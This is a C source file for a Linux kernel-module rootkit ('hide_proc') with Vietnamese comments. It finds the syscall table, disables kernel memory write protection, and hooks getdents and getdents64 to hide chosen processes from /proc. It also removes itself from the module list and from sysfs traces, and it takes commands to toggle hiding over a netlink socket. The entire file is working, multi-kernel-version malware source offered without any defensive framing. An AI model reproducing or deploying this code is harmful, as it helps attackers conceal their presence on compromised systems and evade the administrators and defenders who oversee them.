#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <net/sock.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "hide_proc.h"

// Netlink socket kernel-side
static struct sock *nl_sk = NULL;

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt,
                            phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size (init_begin - start_rodata)
#endif

static unsigned long *__sys_call_table;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && \
    (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
void *sys_call;
#endif

// Con tro toi syscall getdents goc
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents;
static t_syscall orig_getdents64;
#else
typedef asmlinkage long (*orig_getdents_t)(unsigned int,
                                           struct linux_dirent *,
                                           unsigned int);
typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
                                             struct linux_dirent64 *,
                                             unsigned int);
orig_getdents_t  orig_getdents;
orig_getdents64_t orig_getdents64;
#endif

#ifdef KPROBE_LOOKUP
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_name_ = NULL;
#endif

// Tim dia chi symbol trong kernel
unsigned long
resolve_sym(char *symbol)
{
#ifdef KPROBE_LOOKUP
    kallsyms_lookup_name_t kallsyms_lookup_name;
    if (kallsyms_lookup_name_ == NULL) {
        register_kprobe(&kp);
        kallsyms_lookup_name_ = (kallsyms_lookup_name_t)kp.addr;
        unregister_kprobe(&kp);
    }
    kallsyms_lookup_name = kallsyms_lookup_name_;
#endif
    return kallsyms_lookup_name(symbol);
}

// Tim dia chi sys_call_table trong bo nho
unsigned long *
get_syscall_table_bf(void)
{
    unsigned long *syscall_table;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
    syscall_table = (unsigned long *)resolve_sym("sys_call_table");
    return syscall_table;
#else
    unsigned long int i;
    for (i = (unsigned long int)sys_close; i < ULONG_MAX;
         i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;
        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
#endif
}

// Tim task_struct theo PID
struct task_struct *
find_task(pid_t pid)
{
    struct task_struct *p = current;
    for_each_process(p) {
        if (p->pid == pid)
            return p;
    }
    return NULL;
}

// Kiem tra tien trinh co dang bat co an hay khong
int
is_invisible(pid_t pid)
{
    struct task_struct *task;
    if (!pid)
        return 0;
    task = find_task(pid);
    if (!task)
        return 0;
    if (task->flags & PF_INVISIBLE)
        return 1;
    return 0;
}

// Hook getdents64: loc bo PID bi an khoi thu muc /proc
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long
hacked_getdents64(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    int fd                   = (int)pt_regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
    int fd                   = (int)pt_regs->regs[0];
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->regs[1];
#endif
    int ret = orig_getdents64(pt_regs), err;
#else
static asmlinkage long
hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
                  unsigned int count)
{
    int ret = orig_getdents64(fd, dirent, count), err;
#endif
    unsigned short proc = 0;
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct inode *d_inode;

    if (ret <= 0)
        return ret;

    // Kiem tra co phai dang doc thu muc /proc hay khong
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

    if (d_inode->i_ino == PROCFS_ROOT_INO && !MAJOR(d_inode->i_rdev))
        proc = 1;

    // Khong phai /proc thi tra ve ket qua goc luon
    if (!proc)
        return ret;

    // Sao chep danh sach dirent vao kernel buffer de loc
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err)
        goto out;

    // Duyet danh sach, bo qua thu muc /proc/<PID> cua tien trinh an
    while (off < ret) {
        dir = (void *)kdirent + off;
        if (is_invisible(simple_strtoul(dir->d_name, NULL, 10))) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else {
            prev = dir;
        }
        off += dir->d_reclen;
    }

    err = copy_to_user(dirent, kdirent, ret);
    if (err)
        goto out;
out:
    kfree(kdirent);
    return ret;
}

// Hook getdents (32-bit compat): loc bo PID bi an khoi thu muc /proc
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long
hacked_getdents(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    int fd                   = (int)pt_regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
    int fd                   = (int)pt_regs->regs[0];
    struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->regs[1];
#endif
    int ret = orig_getdents(pt_regs), err;
#else
static asmlinkage long
hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
                unsigned int count)
{
    int ret = orig_getdents(fd, dirent, count), err;
#endif
    unsigned short proc = 0;
    unsigned long off = 0;
    struct linux_dirent *dir, *kdirent, *prev = NULL;
    struct inode *d_inode;

    if (ret <= 0)
        return ret;

    // Kiem tra thu muc /proc
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

    if (d_inode->i_ino == PROCFS_ROOT_INO && !MAJOR(d_inode->i_rdev))
        proc = 1;

    if (!proc)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err)
        goto out;

    // Duyet danh sach va loai bo entry cua PID an
    while (off < ret) {
        dir = (void *)kdirent + off;
        if (is_invisible(simple_strtoul(dir->d_name, NULL, 10))) {
            if (dir == kdirent) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        } else {
            prev = dir;
        }
        off += dir->d_reclen;
    }

    err = copy_to_user(dirent, kdirent, ret);
    if (err)
        goto out;
out:
    kfree(kdirent);
    return ret;
}

// Xoa thong tin phan vung khoi sysfs de giam dau vet
static inline void
tidy(void)
{
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;

// Hien lai module trong lsmod
void
module_show(void)
{
    list_add(&THIS_MODULE->list, module_previous);
    module_hidden = 0;
    pr_info("[hide_proc] module: visible\n");
}

// An module khoi lsmod (xoa khoi danh sach lien ket cac module)
void
module_hide(void)
{
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
    pr_info("[hide_proc] module: hidden\n");
}

// Bat/tat che do bao ve ghi bo nho kernel tren thanh ghi CR0
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void
write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}
#endif

static inline void
protect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    write_cr0_forced(cr0);
#else
    write_cr0(cr0);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
    update_mapping_prot(__pa_symbol(start_rodata),
                        (unsigned long)start_rodata,
                        section_size, PAGE_KERNEL_RO);
#endif
}

static inline void
unprotect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    write_cr0_forced(cr0 & ~0x00010000UL);
#else
    write_cr0(cr0 & ~0x00010000UL);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
    update_mapping_prot(__pa_symbol(start_rodata),
                        (unsigned long)start_rodata,
                        section_size, PAGE_KERNEL);
#endif
}

// Inline patch ham x64_sys_call cho Linux >= 6.9 x86
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && \
    (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
void
flipswitch_func(void *target_func, void *hacked_func)
{
    unsigned char *func_ptr = (unsigned char *)sys_call;

    for (size_t i = 0; i < DUMP_SIZE - 4; ++i) {
        if (func_ptr[i] == 0xe9 || func_ptr[i] == 0xe8) {
            int32_t rel = *(int32_t *)(func_ptr + i + 1);
            void *call_addr =
                (void *)((uintptr_t)sys_call + i + 5 + rel);

            if (call_addr == target_func) {
                int32_t new_rel = (uintptr_t)hacked_func -
                                  ((uintptr_t)sys_call + i + 5);
                memcpy(func_ptr + i + 1, &new_rel, sizeof(new_rel));
                break;
            }
        }
    }
}
#endif

// Ma lenh dieu khien qua netlink
#define CMD_HIDE_PID     0x01
#define CMD_MODULE_INVIS 0x02

#define RESP_OK   0x00
#define RESP_ERR  0xFF

struct nl_cmd {
    uint8_t cmd;
    pid_t   pid;
} __attribute__((packed));

// Gui phan hoi ket qua ve user-space
static void
nl_send_reply(u32 portid, uint8_t status)
{
    struct sk_buff *skb_out;
    struct nlmsghdr *nlh;
    uint8_t *resp;

    skb_out = nlmsg_new(sizeof(uint8_t), GFP_KERNEL);
    if (!skb_out)
        return;

    nlh  = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, sizeof(uint8_t), 0);
    resp = (uint8_t *)nlmsg_data(nlh);
    *resp = status;

    NETLINK_CB(skb_out).dst_group = 0;
    nlmsg_unicast(nl_sk, skb_out, portid);
}

// Nhan va xu ly lenh tu user-space qua netlink
static void
nl_recv_cmd(struct sk_buff *skb)
{
    struct nlmsghdr *nlh;
    struct nl_cmd   *cmd;
    u32 sender_pid;
    struct task_struct *task;

    if (!skb)
        return;

    nlh = (struct nlmsghdr *)skb->data;
    if (!nlmsg_ok(nlh, skb->len) || nlmsg_len(nlh) < (int)sizeof(struct nl_cmd))
        return;

    sender_pid = NETLINK_CB(skb).portid;
    cmd = (struct nl_cmd *)nlmsg_data(nlh);

    switch (cmd->cmd) {
    case CMD_HIDE_PID:
        if (cmd->pid <= 0) {
            nl_send_reply(sender_pid, RESP_ERR);
            return;
        }
        task = find_task(cmd->pid);
        if (!task) {
            nl_send_reply(sender_pid, RESP_ERR);
            return;
        }
        // Dao bit PF_INVISIBLE de an hoac hien tien trinh
        task->flags ^= PF_INVISIBLE;
        pr_info("[hide_proc] pid %d: %s\n", cmd->pid,
                (task->flags & PF_INVISIBLE) ? "hidden" : "visible");
        nl_send_reply(sender_pid, RESP_OK);
        break;

    case CMD_MODULE_INVIS:
        // Dao trang thai an/hien kernel module khoi lsmod
        if (module_hidden)
            module_show();
        else
            module_hide();
        nl_send_reply(sender_pid, RESP_OK);
        break;

    default:
        nl_send_reply(sender_pid, RESP_ERR);
        break;
    }
}

// Khoi tao kernel module
static int __init
hide_proc_init(void)
{
    struct netlink_kernel_cfg nl_cfg = {
        .input = nl_recv_cmd,
    };

    // Khoi tao kenh netlink de nhan lenh dieu khien
    nl_sk = netlink_kernel_create(&init_net, NETLINK_DIAMOND, &nl_cfg);
    if (!nl_sk)
        return -ENOMEM;

    // Tim dia chi bang sys_call_table
    __sys_call_table = get_syscall_table_bf();
    if (!__sys_call_table) {
        netlink_kernel_release(nl_sk);
        nl_sk = NULL;
        return -1;
    }

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    cr0 = read_cr0();
#elif IS_ENABLED(CONFIG_ARM64)
    update_mapping_prot =
        (void *)resolve_sym("update_mapping_prot");
    start_rodata = (unsigned long)resolve_sym("__start_rodata");
    init_begin   = (unsigned long)resolve_sym("__init_begin");
#endif

    // An module khoi lsmod ngay sau khi nap
    module_hide();
    tidy();

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && \
    (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
    sys_call = (t_syscall)resolve_sym("x64_sys_call");
    if (!sys_call) {
        netlink_kernel_release(nl_sk);
        nl_sk = NULL;
        return -1;
    }
#endif

    // Luu syscall goc va ghi de bang hook getdents
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    orig_getdents   = (t_syscall)__sys_call_table[__NR_getdents];
    orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
#else
    orig_getdents   = (orig_getdents_t)__sys_call_table[__NR_getdents];
    orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
#endif

    unprotect_memory();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && \
    (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
    flipswitch_func(orig_getdents,   hacked_getdents);
    flipswitch_func(orig_getdents64, hacked_getdents64);
#else
    __sys_call_table[__NR_getdents]   = (unsigned long)hacked_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
#endif
    protect_memory();

    pr_info("[hide_proc] loaded\n");
    return 0;
}

// Don dep va go bo kernel module
static void __exit
hide_proc_cleanup(void)
{
    // Khoi phuc lai syscall getdents goc
    unprotect_memory();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0) && \
    (IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64))
    flipswitch_func(hacked_getdents,   orig_getdents);
    flipswitch_func(hacked_getdents64, orig_getdents64);
#else
    __sys_call_table[__NR_getdents]   = (unsigned long)orig_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
#endif
    protect_memory();

    // Dong socket netlink
    if (nl_sk) {
        netlink_kernel_release(nl_sk);
        nl_sk = NULL;
    }

    pr_info("[hide_proc] unloaded\n");
}

module_init(hide_proc_init);
module_exit(hide_proc_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_DESCRIPTION("LKM process hiding via Netlink");
